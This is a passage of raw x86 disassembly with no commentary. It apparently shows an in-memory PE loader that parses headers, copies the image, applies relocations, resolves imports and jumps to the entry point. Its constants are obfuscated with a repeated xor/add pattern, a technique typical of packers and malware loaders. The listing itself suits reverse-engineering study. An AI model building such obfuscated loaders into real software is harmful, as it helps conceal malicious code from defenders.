  4267ae:	mov    eax,0x7060e3c
  4267b3:	mov    DWORD PTR [esi],eax
  4267b5:	mov    esi,DWORD PTR [ebp-0x8]
  4267b8:	cmp    esi,eax
  4267ba:	pop    esi
  4267bb:	jne    0x4267c7
  4267bd:	mov    BYTE PTR [edx+0x4],0x12
  4267c1:	mov    WORD PTR [ecx+0x3],0x121f
  4267c7:	mov    BYTE PTR [edx],0x3e
  4267ca:	leave  
  4267cb:	ret    
  4267cc:	push   ebp
  4267cd:	mov    ebp,esp
  4267cf:	push   ecx
  4267d0:	push   ecx
  4267d1:	lea    eax,[ebp-0x8]
  4267d4:	mov    DWORD PTR [ebp-0x4],eax
  4267d7:	mov    edx,DWORD PTR [ebp-0x4]
  4267da:	mov    eax,0xf8870b3f
  4267df:	mov    DWORD PTR [edx],eax
  4267e1:	mov    edx,DWORD PTR [ebp-0x8]
  4267e4:	cmp    edx,eax
  4267e6:	jne    0x4267f3
  4267e8:	mov    eax,DWORD PTR [ebp+0x8]
  4267eb:	mov    BYTE PTR [ecx+0x8],0xe
  4267ef:	mov    BYTE PTR [eax+0x1],0x14
  4267f3:	mov    BYTE PTR [ecx+0x5],0xa
  4267f7:	leave  
  4267f8:	ret    0x4
  4267fb:	push   esi
  4267fc:	mov    ecx,edi
  4267fe:	call   0x4267cc
  426803:	mov    edx,edi
  426805:	mov    ecx,esi
  426807:	mov    BYTE PTR [esi],0x1e
  42680a:	call   0x42679f
  42680f:	push   esi
  426810:	mov    ecx,edi
  426812:	mov    BYTE PTR [esi+0x5],0xa
  426816:	call   0x426770
  42681b:	push   esi
  42681c:	mov    BYTE PTR [esi+0x6],0xe
  426820:	call   0x42673d
  426825:	mov    BYTE PTR [esi+0x2],0x11
  426829:	mov    edx,esi
  42682b:	jmp    0x42670d
  426830:	push   ebp
  426831:	mov    ebp,esp
  426833:	push   ecx
  426834:	mov    ecx,DWORD PTR [edx+0x194]
  42683a:	push   esi
  42683b:	mov    esi,DWORD PTR [ebp+0x8]
  42683e:	mov    esi,DWORD PTR [esi]
  426840:	mov    DWORD PTR [ecx],esi
  426842:	mov    ecx,DWORD PTR [edx+0x194]
  426848:	mov    ecx,DWORD PTR [ecx]
  42684a:	mov    esi,DWORD PTR [edx+0x190]
  426850:	mov    DWORD PTR [esi],ecx
  426852:	mov    eax,DWORD PTR [edx+0x194]
  426858:	mov    ecx,DWORD PTR [eax]
  42685a:	mov    ecx,DWORD PTR [ecx+0x3c]
  42685d:	add    ecx,DWORD PTR [eax]
  42685f:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  426866:	mov    eax,DWORD PTR [ebp-0x4]
  426869:	movzx  ecx,WORD PTR [ecx+0x16]
  42686d:	xor    eax,0x75108aa
  426872:	add    eax,0x3272f1
  426877:	pop    esi
  426878:	test   ecx,eax
  42687a:	je     0x426888
  42687c:	mov    eax,DWORD PTR [edx+0x1c8]
  426882:	mov    DWORD PTR [eax],0xf89c85ba
  426888:	leave  
  426889:	ret    0x4
  42688c:	push   ebp
  42688d:	mov    ebp,esp
  42688f:	sub    esp,0x70
  426892:	and    DWORD PTR [ebp-0x20],0x0
  426896:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  42689d:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  4268a4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4268ab:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4268b2:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  4268b9:	mov    eax,DWORD PTR [ebp+0x20]
  4268bc:	mov    eax,DWORD PTR [eax+0x194]
  4268c2:	mov    DWORD PTR [ebp-0xc],eax
  4268c5:	mov    eax,DWORD PTR [ebp+0x20]
  4268c8:	push   ebx
  4268c9:	push   esi
  4268ca:	mov    esi,DWORD PTR [eax+0x190]
  4268d0:	mov    eax,DWORD PTR [ebp+0x20]
  4268d3:	mov    eax,DWORD PTR [eax+0x18c]
  4268d9:	mov    DWORD PTR [ebp-0x8],eax
  4268dc:	mov    eax,DWORD PTR [eax]
  4268de:	push   edi
  4268df:	mov    DWORD PTR [ebp-0x4],esi
  4268e2:	test   eax,eax
  4268e4:	jne    0x4268f1
  4268e6:	push   DWORD PTR [ebp+0x1c]
  4268e9:	mov    edx,DWORD PTR [ebp+0x20]
  4268ec:	call   0x426830
  4268f1:	mov    eax,DWORD PTR [esi]
  4268f3:	mov    ebx,DWORD PTR [esi]
  4268f5:	add    ebx,DWORD PTR [eax+0x3c]
  4268f8:	mov    eax,DWORD PTR [ebp+0xc]
  4268fb:	mov    ecx,DWORD PTR [ebp-0x8]
  4268fe:	mov    ecx,DWORD PTR [ecx]
  426900:	mov    esi,0x75108aa
  426905:	xor    eax,esi
  426907:	mov    edi,0x3272f1
  42690c:	add    eax,edi
  42690e:	cmp    eax,ecx
  426910:	jne    0x426b48
  426916:	mov    eax,DWORD PTR [ebp-0xc]
  426919:	mov    eax,DWORD PTR [eax]
  42691b:	mov    DWORD PTR [ebp-0x10],eax
  42691e:	mov    eax,DWORD PTR [ebx+0x50]
  426921:	mov    DWORD PTR [ebp-0x68],eax
  426924:	mov    eax,DWORD PTR [ebp-0x18]
  426927:	xor    eax,esi
  426929:	add    eax,edi
  42692b:	mov    DWORD PTR [ebp-0x64],eax
  42692e:	mov    eax,DWORD PTR [ebp-0x14]
  426931:	and    DWORD PTR [ebp-0x6c],0x0
  426935:	xor    eax,esi
  426937:	add    eax,edi
  426939:	mov    DWORD PTR [ebp-0x60],eax
  42693c:	lea    eax,[ebp-0x70]
  42693f:	push   eax
  426940:	mov    eax,DWORD PTR [ebp+0x8]
  426943:	xor    eax,esi
  426945:	add    eax,edi
  426947:	push   eax
  426948:	mov    eax,DWORD PTR [ebp+0x20]
  42694b:	add    eax,0xaa
  426950:	push   eax
  426951:	mov    eax,DWORD PTR [ebp+0x20]
  426954:	mov    eax,DWORD PTR [eax+0x198]
  42695a:	mov    DWORD PTR [ebp-0x70],0x4
  426961:	push   DWORD PTR [eax]
  426963:	mov    eax,DWORD PTR [ebp+0x10]
  426966:	call   eax
  426968:	mov    ecx,DWORD PTR [ebp-0xc]
  42696b:	mov    ecx,DWORD PTR [ecx]
  42696d:	mov    edx,DWORD PTR [ebp-0x8]
  426970:	mov    DWORD PTR [ebp-0x6c],eax
  426973:	mov    DWORD PTR [ebp+0x1c],eax
  426976:	mov    DWORD PTR [edx],ecx
  426978:	mov    ecx,DWORD PTR [ebp-0x4]
  42697b:	mov    DWORD PTR [ecx],eax
  42697d:	mov    eax,DWORD PTR [ebx+0x50]
  426980:	mov    DWORD PTR [ebp-0x68],eax
  426983:	mov    eax,DWORD PTR [ebp-0x1c]
  426986:	xor    eax,esi
  426988:	add    eax,edi
  42698a:	mov    DWORD PTR [ebp-0x64],eax
  42698d:	lea    eax,[ebp-0x20]
  426990:	mov    DWORD PTR [ebp-0x60],eax
  426993:	lea    eax,[ebp-0x70]
  426996:	push   eax
  426997:	mov    eax,DWORD PTR [ebp+0x8]
  42699a:	xor    eax,esi
  42699c:	add    eax,edi
  42699e:	push   eax
  42699f:	mov    eax,DWORD PTR [ebp+0x20]
  4269a2:	add    eax,0xee
  4269a7:	push   eax
  4269a8:	mov    eax,DWORD PTR [ebp+0x20]
  4269ab:	mov    eax,DWORD PTR [eax+0x198]
  4269b1:	mov    DWORD PTR [ebp-0x70],0x4
  4269b8:	push   DWORD PTR [eax]
  4269ba:	mov    eax,DWORD PTR [ebp+0x10]
  4269bd:	call   eax
  4269bf:	test   eax,eax
  4269c1:	je     0x4269e6
  4269c3:	and    DWORD PTR [ebp+0xc],0x0
  4269c7:	cmp    DWORD PTR [ebx+0x50],0x0
  4269cb:	jbe    0x4269e6
  4269cd:	mov    eax,DWORD PTR [ebp+0x1c]
  4269d0:	mov    ecx,DWORD PTR [ebp-0x10]
  4269d3:	sub    ecx,eax
  4269d5:	mov    dl,BYTE PTR [ecx+eax*1]
  4269d8:	inc    DWORD PTR [ebp+0xc]
  4269db:	mov    BYTE PTR [eax],dl
  4269dd:	mov    edx,DWORD PTR [ebp+0xc]
  4269e0:	inc    eax
  4269e1:	cmp    edx,DWORD PTR [ebx+0x50]
  4269e4:	jb     0x4269d5
  4269e6:	mov    edx,DWORD PTR [ebp+0x1c]
  4269e9:	mov    ecx,DWORD PTR [edx+0x3c]
  4269ec:	add    ecx,edx
  4269ee:	mov    eax,DWORD PTR [ecx+0xa0]
  4269f4:	mov    ebx,DWORD PTR [ecx+0x28]
  4269f7:	add    eax,edx
  4269f9:	sub    edx,DWORD PTR [ebp-0x10]
  4269fc:	add    ebx,DWORD PTR [ebp+0x1c]
  4269ff:	mov    DWORD PTR [ebp+0xc],edx
  426a02:	mov    DWORD PTR [ebp-0x2c],ecx
  426a05:	mov    DWORD PTR [ebp-0x14],ebx
  426a08:	mov    DWORD PTR [ebp-0x8],0x0
  426a0f:	jmp    0x426a8b
  426a11:	add    edx,0xfffffff8
  426a14:	shr    edx,1
  426a16:	mov    DWORD PTR [ebp-0x18],edx
  426a19:	je     0x426a77
  426a1b:	lea    edx,[eax+0x8]
  426a1e:	mov    DWORD PTR [ebp-0x4],edx
  426a21:	mov    edx,DWORD PTR [ebp-0x18]
  426a24:	mov    DWORD PTR [ebp-0x18],edx
  426a27:	mov    edx,DWORD PTR [ebp-0x4]
  426a2a:	movzx  edx,WORD PTR [edx]
  426a2d:	mov    DWORD PTR [ebp-0x24],edx
  426a30:	and    edx,0xfff
  426a36:	mov    DWORD PTR [ebp-0x28],edx
  426a39:	mov    edx,DWORD PTR [ebp-0x24]
  426a3c:	shr    edx,0xc
  426a3f:	add    edx,0xffcd8d0f
  426a45:	xor    edx,esi
  426a47:	cmp    edx,0xf89c85b8
  426a4d:	jne    0x426a6e
  426a4f:	mov    edx,DWORD PTR [ebp-0x28]
  426a52:	add    edx,DWORD PTR [ebp+0x1c]
  426a55:	mov    ebx,DWORD PTR [eax]
  426a57:	cmp    DWORD PTR [ebx+edx*1],0x0
  426a5b:	je     0x426a6b
  426a5d:	mov    ecx,DWORD PTR [ebp+0xc]
  426a60:	add    ecx,DWORD PTR [ebx+edx*1]
  426a63:	mov    ebx,DWORD PTR [eax]
  426a65:	mov    DWORD PTR [edx+ebx*1],ecx
  426a68:	mov    ecx,DWORD PTR [ebp-0x2c]
  426a6b:	mov    ebx,DWORD PTR [ebp-0x14]
  426a6e:	add    DWORD PTR [ebp-0x4],0x2
  426a72:	dec    DWORD PTR [ebp-0x18]
  426a75:	jne    0x426a27
  426a77:	mov    edx,DWORD PTR [ebp-0xc]
  426a7a:	add    DWORD PTR [ebp-0x8],edx
  426a7d:	mov    edx,DWORD PTR [ebp-0x8]
  426a80:	cmp    edx,DWORD PTR [ecx+0xa4]
  426a86:	jae    0x426a99
  426a88:	add    eax,DWORD PTR [ebp-0xc]
  426a8b:	mov    edx,DWORD PTR [eax+0x4]
  426a8e:	mov    DWORD PTR [ebp-0xc],edx
  426a91:	test   edx,edx
  426a93:	jne    0x426a11
  426a99:	mov    eax,DWORD PTR [ebp-0x10]
  426a9c:	mov    DWORD PTR [ebp-0x6c],eax
  426a9f:	mov    DWORD PTR [ebp-0x70],0x4
  426aa6:	mov    eax,DWORD PTR [ecx+0x50]
  426aa9:	mov    DWORD PTR [ebp-0x68],eax
  426aac:	mov    eax,DWORD PTR [ebp-0x1c]
  426aaf:	xor    eax,esi
  426ab1:	add    eax,edi
  426ab3:	mov    DWORD PTR [ebp-0x64],eax
  426ab6:	lea    eax,[ebp-0x20]
  426ab9:	mov    DWORD PTR [ebp-0x60],eax
  426abc:	lea    eax,[ebp-0x70]
  426abf:	push   eax
  426ac0:	mov    eax,DWORD PTR [ebp+0x8]
  426ac3:	xor    eax,esi
  426ac5:	add    eax,edi
  426ac7:	push   eax
  426ac8:	mov    eax,DWORD PTR [ebp+0x20]
  426acb:	add    eax,0xee
  426ad0:	push   eax
  426ad1:	mov    eax,DWORD PTR [ebp+0x20]
  426ad4:	mov    eax,DWORD PTR [eax+0x198]
  426ada:	push   DWORD PTR [eax]
  426adc:	mov    eax,DWORD PTR [ebp+0x10]
  426adf:	call   eax
  426ae1:	mov    eax,DWORD PTR [ebp+0x20]
  426ae4:	mov    eax,DWORD PTR [eax+0x180]
  426aea:	add    eax,DWORD PTR [ebp+0xc]
  426aed:	mov    ecx,DWORD PTR [ebp+0xc]
  426af0:	push   DWORD PTR [ebp+0x18]
  426af3:	mov    DWORD PTR [eax],ecx
  426af5:	push   DWORD PTR [ebp+0x14]
  426af8:	push   DWORD PTR [ebp+0x1c]
  426afb:	call   ebx
  426afd:	mov    ecx,DWORD PTR [ebp+0xc]
  426b00:	add    ecx,DWORD PTR [ebp+0x20]
  426b03:	lea    eax,[ebp+0x4]
  426b06:	mov    DWORD PTR [ebp+0x20],ecx
  426b09:	mov    ecx,DWORD PTR [ebp+0x20]
  426b0c:	mov    ecx,DWORD PTR [ebp+0x20]
  426b0f:	mov    edx,DWORD PTR [ecx+0x190]
  426b15:	mov    ecx,DWORD PTR [ebp+0x20]
  426b18:	mov    ecx,DWORD PTR [ecx+0x18c]
  426b1e:	mov    esi,DWORD PTR [ecx]
  426b20:	cmp    DWORD PTR [eax],esi
  426b22:	jb     0x426b43
  426b24:	mov    esi,DWORD PTR [edx]
  426b26:	mov    edi,DWORD PTR [edx]
  426b28:	mov    esi,DWORD PTR [esi+0x3c]
  426b2b:	lea    esi,[edi+esi*1+0x50]
  426b2f:	mov    edi,DWORD PTR [ecx]
  426b31:	add    edi,DWORD PTR [esi]
  426b33:	cmp    DWORD PTR [eax],edi
  426b35:	jae    0x426b43
  426b37:	mov    esi,DWORD PTR [ecx]
  426b39:	mov    ecx,DWORD PTR [eax]
  426b3b:	mov    edx,DWORD PTR [edx]
  426b3d:	sub    ecx,esi
  426b3f:	add    edx,ecx
  426b41:	mov    DWORD PTR [eax],edx
  426b43:	mov    eax,DWORD PTR [ebp+0xc]
  426b46:	jmp    0x426b4a
  426b48:	xor    eax,eax
  426b4a:	pop    edi
  426b4b:	pop    esi
  426b4c:	pop    ebx
  426b4d:	leave  
  426b4e:	ret    0x1c
  426b51:	push   ebp
  426b52:	mov    ebp,esp
  426b54:	sub    esp,0x1c
  426b57:	push   esi
  426b58:	mov    esi,eax
  426b5a:	mov    eax,DWORD PTR [ecx+0x190]
  426b60:	cmp    DWORD PTR [eax],0x0
  426b63:	je     0x426c73
  426b69:	test   edx,edx
  426b6b:	je     0x426c73
  426b71:	test   esi,esi
  426b73:	je     0x426c73
  426b79:	mov    eax,DWORD PTR [esi+0x88]
  426b7f:	test   eax,eax
  426b81:	je     0x426c6e
  426b87:	cmp    DWORD PTR [esi+0x8c],0x10
  426b8e:	je     0x426c6e
  426b94:	cmp    DWORD PTR [esi+0x34],edx
  426b97:	je     0x426c6e
  426b9d:	mov    esi,DWORD PTR [ecx+0x18c]
  426ba3:	and    DWORD PTR [ebp-0x10],0x0
  426ba7:	mov    ecx,edx
  426ba9:	sub    ecx,DWORD PTR [esi]
  426bab:	add    eax,edx
  426bad:	movzx  edx,WORD PTR [eax+0xc]
  426bb1:	mov    DWORD PTR [ebp-0x1c],ecx
  426bb4:	movzx  ecx,WORD PTR [eax+0xe]
  426bb8:	add    ecx,edx
  426bba:	je     0x426c6e
  426bc0:	lea    ecx,[eax+0x14]
  426bc3:	push   ebx
  426bc4:	mov    DWORD PTR [ebp-0x18],ecx
  426bc7:	mov    esi,0x7fffffff
  426bcc:	push   edi
  426bcd:	test   DWORD PTR [ecx],esi
  426bcf:	je     0x426c50
  426bd1:	mov    edx,DWORD PTR [ecx]
  426bd3:	and    DWORD PTR [ebp-0xc],0x0
  426bd7:	and    edx,esi
  426bd9:	add    edx,eax
  426bdb:	movzx  edi,WORD PTR [edx+0xe]
  426bdf:	movzx  ebx,WORD PTR [edx+0xc]
  426be3:	add    edi,ebx
  426be5:	je     0x426c50
  426be7:	lea    ecx,[edx+0x14]
  426bea:	mov    DWORD PTR [ebp-0x14],ecx
  426bed:	test   DWORD PTR [ecx],esi
  426bef:	je     0x426c32
  426bf1:	mov    ecx,DWORD PTR [ecx]
  426bf3:	and    DWORD PTR [ebp-0x8],0x0
  426bf7:	and    ecx,esi
  426bf9:	add    ecx,eax
  426bfb:	movzx  edi,WORD PTR [ecx+0xe]
  426bff:	movzx  ebx,WORD PTR [ecx+0xc]
  426c03:	add    edi,ebx
  426c05:	je     0x426c32
  426c07:	lea    edi,[ecx+0x14]
  426c0a:	mov    DWORD PTR [ebp-0x4],edi
  426c0d:	mov    edi,DWORD PTR [ebp-0x4]
  426c10:	mov    edi,DWORD PTR [edi]
  426c12:	test   edi,edi
  426c14:	je     0x426c1c
  426c16:	mov    ebx,DWORD PTR [ebp-0x1c]
  426c19:	add    DWORD PTR [edi+eax*1],ebx
  426c1c:	movzx  edi,WORD PTR [ecx+0xe]
  426c20:	movzx  ebx,WORD PTR [ecx+0xc]
  426c24:	inc    DWORD PTR [ebp-0x8]
  426c27:	add    DWORD PTR [ebp-0x4],0x8
  426c2b:	add    edi,ebx
  426c2d:	cmp    DWORD PTR [ebp-0x8],edi
  426c30:	jb     0x426c0d
  426c32:	movzx  edi,WORD PTR [edx+0xe]
  426c36:	movzx  ebx,WORD PTR [edx+0xc]
  426c3a:	mov    ecx,DWORD PTR [ebp-0x14]
  426c3d:	inc    DWORD PTR [ebp-0xc]
  426c40:	add    ecx,0x8
  426c43:	add    edi,ebx
  426c45:	mov    DWORD PTR [ebp-0x14],ecx
  426c48:	cmp    DWORD PTR [ebp-0xc],edi
  426c4b:	jb     0x426bed
  426c4d:	mov    ecx,DWORD PTR [ebp-0x18]
  426c50:	movzx  edx,WORD PTR [eax+0xe]
  426c54:	movzx  edi,WORD PTR [eax+0xc]
  426c58:	inc    DWORD PTR [ebp-0x10]
  426c5b:	add    ecx,0x8
  426c5e:	add    edx,edi
  426c60:	mov    DWORD PTR [ebp-0x18],ecx
  426c63:	cmp    DWORD PTR [ebp-0x10],edx
  426c66:	jb     0x426bcd
  426c6c:	pop    edi
  426c6d:	pop    ebx
  426c6e:	xor    eax,eax
  426c70:	inc    eax
  426c71:	jmp    0x426c75
  426c73:	xor    eax,eax
  426c75:	pop    esi
  426c76:	leave  
  426c77:	ret    
  426c78:	push   ebp
  426c79:	mov    ebp,esp
  426c7b:	mov    ecx,DWORD PTR [ecx+0x190]
  426c81:	mov    eax,DWORD PTR [ebp+0xc]
  426c84:	sub    esp,0x10
  426c87:	push   ebx
  426c88:	xor    ebx,ebx
  426c8a:	push   esi
  426c8b:	push   edi
  426c8c:	cmp    DWORD PTR [ecx],ebx
  426c8e:	je     0x426d16
  426c94:	cmp    eax,ebx
  426c96:	je     0x426d16
  426c98:	cmp    DWORD PTR [eax+0x78],ebx
  426c9b:	jne    0x426ca2
  426c9d:	xor    eax,eax
  426c9f:	inc    eax
  426ca0:	jmp    0x426d18
  426ca2:	mov    eax,DWORD PTR [eax+0x78]
  426ca5:	add    eax,DWORD PTR [ebp+0x8]
  426ca8:	mov    ecx,DWORD PTR [eax+0x1c]
  426cab:	mov    edx,DWORD PTR [eax+0x24]
  426cae:	mov    esi,DWORD PTR [eax+0x14]
  426cb1:	mov    edi,DWORD PTR [eax+0x18]
  426cb4:	add    ecx,DWORD PTR [ebp+0x8]
  426cb7:	add    edx,DWORD PTR [ebp+0x8]
  426cba:	mov    DWORD PTR [ebp-0x4],esi
  426cbd:	cmp    esi,edi
  426cbf:	ja     0x426cc4
  426cc1:	mov    DWORD PTR [ebp-0x4],edi
  426cc4:	mov    DWORD PTR [ebp-0x8],ebx
  426cc7:	cmp    DWORD PTR [ebp-0x4],ebx
  426cca:	jbe    0x426c9d
  426ccc:	cmp    ebx,DWORD PTR [eax+0x14]
  426ccf:	jae    0x426cd7
  426cd1:	movzx  esi,WORD PTR [edx+ebx*2]
  426cd5:	jmp    0x426cd9
  426cd7:	mov    esi,ebx
  426cd9:	lea    esi,[ecx+esi*4]
  426cdc:	mov    edi,DWORD PTR [esi]
  426cde:	test   edi,edi
  426ce0:	je     0x426d0b
  426ce2:	add    edi,DWORD PTR [ebp+0x8]
  426ce5:	mov    DWORD PTR [ebp-0x10],edi
  426ce8:	cmp    edi,eax
  426cea:	jbe    0x426cfc
  426cec:	mov    ebx,DWORD PTR [ebp+0xc]
  426cef:	mov    ebx,DWORD PTR [ebx+0x7c]
  426cf2:	add    ebx,eax
  426cf4:	cmp    edi,ebx
  426cf6:	jae    0x426cfc
  426cf8:	mov    esi,DWORD PTR [esi]
  426cfa:	jmp    0x426d04
  426cfc:	sub    edi,DWORD PTR [ebp+0x8]
  426cff:	mov    DWORD PTR [esi],edi
  426d01:	mov    esi,DWORD PTR [ebp-0x10]
  426d04:	test   esi,esi
  426d06:	je     0x426d16
  426d08:	mov    ebx,DWORD PTR [ebp-0x8]
  426d0b:	inc    ebx
  426d0c:	mov    DWORD PTR [ebp-0x8],ebx
  426d0f:	cmp    ebx,DWORD PTR [ebp-0x4]
  426d12:	jb     0x426ccc
  426d14:	jmp    0x426c9d
  426d16:	xor    eax,eax
  426d18:	pop    edi
  426d19:	pop    esi
  426d1a:	pop    ebx
  426d1b:	leave  
  426d1c:	ret    0x8
  426d1f:	push   ebp
  426d20:	mov    ebp,esp
  426d22:	sub    esp,0x2c
  426d25:	mov    edx,0xf89c85a5
  426d2a:	mov    DWORD PTR [ebp-0x4],edx
  426d2d:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  426d34:	mov    eax,DWORD PTR [ebp-0x4]
  426d37:	mov    ecx,DWORD PTR [ebp-0x4]
  426d3a:	mov    ecx,DWORD PTR [ebp-0x4]
  426d3d:	mov    ecx,DWORD PTR [ebp-0x4]
  426d40:	mov    ecx,DWORD PTR [ebp-0x4]
  426d43:	mov    ecx,DWORD PTR [ebp-0x4]
  426d46:	push   ebx
  426d47:	mov    ebx,DWORD PTR [ebp+0x10]
  426d4a:	push   esi
  426d4b:	mov    esi,0x75108aa
  426d50:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  426d57:	mov    ecx,DWORD PTR [ebp-0x4]
  426d5a:	mov    ebx,DWORD PTR [ebx+0x190]
  426d60:	push   edi
  426d61:	mov    edi,0x3272f1
  426d66:	xor    ecx,esi
  426d68:	xor    eax,esi
  426d6a:	add    eax,edi
  426d6c:	add    ecx,edi
  426d6e:	mov    DWORD PTR [ebp-0x18],eax
  426d71:	cmp    ecx,DWORD PTR [ebx]
  426d73:	je     0x426ff4
  426d79:	mov    ebx,DWORD PTR [ebp-0x4]
  426d7c:	mov    ecx,DWORD PTR [ebp+0xc]
  426d7f:	xor    ebx,esi
  426d81:	add    ebx,edi
  426d83:	cmp    ebx,ecx
  426d85:	je     0x426ff4
  426d8b:	mov    ebx,DWORD PTR [ebp-0x4]
  426d8e:	mov    ecx,DWORD PTR [ecx+0x80]
  426d94:	xor    ebx,esi
  426d96:	add    ebx,edi
  426d98:	cmp    ecx,ebx
  426d9a:	je     0x426fef
  426da0:	add    ecx,DWORD PTR [ebp+0x8]
  426da3:	mov    DWORD PTR [ebp-0x2c],ecx
  426da6:	mov    ebx,edx
  426da8:	xor    ebx,esi
  426daa:	add    ebx,edi
  426dac:	mov    DWORD PTR [ebp-0x10],ebx
  426daf:	mov    ebx,DWORD PTR [ebp-0x10]
  426db2:	cmp    ebx,edx
  426db4:	je     0x426dc8
  426db6:	mov    edx,DWORD PTR [ebp-0x10]
  426db9:	mov    ebx,DWORD PTR [ebp-0x4]
  426dbc:	imul   edx,edx,0x14
  426dbf:	xor    ebx,esi
  426dc1:	add    ebx,edi
  426dc3:	cmp    DWORD PTR [edx+ecx*1],ebx
  426dc6:	jne    0x426ddf
  426dc8:	mov    edx,DWORD PTR [ebp-0x10]
  426dcb:	mov    ebx,DWORD PTR [ebp-0x4]
  426dce:	imul   edx,edx,0x14
  426dd1:	xor    ebx,esi
  426dd3:	add    ebx,edi
  426dd5:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  426dd9:	je     0x426fe1
  426ddf:	mov    eax,DWORD PTR [ebp-0x4]
  426de2:	mov    ebx,DWORD PTR [ebp-0x4]
  426de5:	mov    eax,DWORD PTR [ebp-0x10]
  426de8:	imul   eax,eax,0x14
  426deb:	add    eax,ecx
  426ded:	mov    ecx,DWORD PTR [eax+0x10]
  426df0:	add    ecx,DWORD PTR [ebp+0x8]
  426df3:	xor    ebx,esi
  426df5:	mov    DWORD PTR [ebp-0x1c],ecx
  426df8:	mov    ecx,DWORD PTR [ebp-0x4]
  426dfb:	mov    edx,DWORD PTR [ebp-0x4]
  426dfe:	xor    ecx,esi
  426e00:	add    ecx,edi
  426e02:	xor    edx,esi
  426e04:	mov    DWORD PTR [ebp-0x24],ecx
  426e07:	mov    ecx,DWORD PTR [eax]
  426e09:	add    edx,edi
  426e0b:	add    ebx,edi
  426e0d:	cmp    ecx,edx
  426e0f:	je     0x426e17
  426e11:	add    ecx,DWORD PTR [ebp+0x8]
  426e14:	mov    DWORD PTR [ebp-0x24],ecx
  426e17:	mov    ecx,DWORD PTR [ebp-0x4]
  426e1a:	xor    ecx,esi
  426e1c:	add    ecx,DWORD PTR [eax+0xc]
  426e1f:	mov    eax,DWORD PTR [ebp+0x8]
  426e22:	lea    eax,[ecx+eax*1+0x3272f1]
  426e29:	mov    DWORD PTR [ebp+0xc],eax
  426e2c:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  426e33:	mov    eax,DWORD PTR [ebp+0x10]
  426e36:	push   DWORD PTR [ebp+0xc]
  426e39:	mov    eax,DWORD PTR [eax+0x1e0]
  426e3f:	call   DWORD PTR [eax]
  426e41:	mov    ecx,DWORD PTR [ebp-0x4]
  426e44:	xor    ecx,esi
  426e46:	add    ecx,edi
  426e48:	mov    DWORD PTR [ebp-0xc],eax
  426e4b:	cmp    ecx,eax
  426e4d:	jne    0x426e61
  426e4f:	mov    eax,DWORD PTR [ebp+0x10]
  426e52:	push   DWORD PTR [ebp+0xc]
  426e55:	mov    eax,DWORD PTR [eax+0x1e0]
  426e5b:	call   DWORD PTR [eax+0xc]
  426e5e:	mov    DWORD PTR [ebp-0xc],eax
  426e61:	mov    DWORD PTR [ebp-0x20],0x7f661b22
  426e68:	mov    DWORD PTR [ebp-0x20],0xf89c9852
  426e6f:	mov    eax,DWORD PTR [ebp-0x4]
  426e72:	xor    eax,esi
  426e74:	add    eax,edi
  426e76:	cmp    eax,DWORD PTR [ebp-0xc]
  426e79:	jne    0x426e9e
  426e7b:	mov    eax,DWORD PTR [ebp-0x8]
  426e7e:	mov    ecx,DWORD PTR [ebp-0x20]
  426e81:	xor    eax,esi
  426e83:	xor    ecx,esi
  426e85:	lea    ebx,[ebx+eax*1+0x3272f1]
  426e8c:	mov    eax,DWORD PTR [ebp+0x10]
  426e8f:	mov    eax,DWORD PTR [eax+0x1e0]
  426e95:	add    ecx,edi
  426e97:	imul   ecx,ebx
  426e9a:	push   ecx
  426e9b:	call   DWORD PTR [eax+0x24]
  426e9e:	mov    eax,DWORD PTR [ebp-0x4]
  426ea1:	xor    eax,esi
  426ea3:	add    eax,edi
  426ea5:	cmp    eax,DWORD PTR [ebp-0xc]
  426ea8:	jne    0x426eb9
  426eaa:	mov    eax,DWORD PTR [ebp-0x28]
  426ead:	xor    eax,esi
  426eaf:	add    eax,edi
  426eb1:	cmp    ebx,eax
  426eb3:	jbe    0x426e33
  426eb9:	mov    eax,DWORD PTR [ebp-0x4]
  426ebc:	xor    eax,esi
  426ebe:	add    eax,edi
  426ec0:	cmp    eax,DWORD PTR [ebp-0xc]
  426ec3:	jne    0x426edc
  426ec5:	mov    eax,DWORD PTR [ebp-0x8]
  426ec8:	mov    ecx,DWORD PTR [ebp-0x18]
  426ecb:	xor    eax,esi
  426ecd:	lea    eax,[ecx+eax*1+0x3272f1]
  426ed4:	mov    DWORD PTR [ebp-0x18],eax
  426ed7:	jmp    0x426fcb
  426edc:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  426ee3:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  426eea:	mov    ebx,DWORD PTR [ebp-0x4]
  426eed:	xor    ebx,esi
  426eef:	add    ebx,edi
  426ef1:	jmp    0x426fb8
  426ef6:	mov    eax,DWORD PTR [ebp-0x4]
  426ef9:	xor    eax,esi
  426efb:	add    eax,edi
  426efd:	mov    DWORD PTR [ebp-0x14],eax
  426f00:	mov    eax,DWORD PTR [ebp-0x4]
  426f03:	xor    eax,esi
  426f05:	add    eax,edi
  426f07:	mov    DWORD PTR [ebp+0xc],eax
  426f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  426f0d:	mov    eax,DWORD PTR [ebp-0x24]
  426f10:	xor    ecx,esi
  426f12:	add    ecx,edi
  426f14:	cmp    ecx,eax
  426f16:	je     0x426f1e
  426f18:	mov    eax,DWORD PTR [eax+ebx*4]
  426f1b:	mov    DWORD PTR [ebp-0x14],eax
  426f1e:	mov    eax,DWORD PTR [ebp-0x1c]
  426f21:	mov    eax,DWORD PTR [eax+ebx*4]
  426f24:	mov    DWORD PTR [ebp+0xc],eax
  426f27:	mov    eax,DWORD PTR [ebp-0x4]
  426f2a:	mov    ecx,DWORD PTR [ebp-0x14]
  426f2d:	xor    eax,esi
  426f2f:	add    eax,edi
  426f31:	cmp    eax,ecx
  426f33:	je     0x426f5e
  426f35:	mov    eax,DWORD PTR [ebp-0x4]
  426f38:	mov    ecx,DWORD PTR [ebp-0x14]
  426f3b:	xor    eax,esi
  426f3d:	add    eax,edi
  426f3f:	shr    ecx,0x1f
  426f42:	cmp    eax,ecx
  426f44:	je     0x426f5e
  426f46:	mov    ecx,DWORD PTR [ebp-0x14]
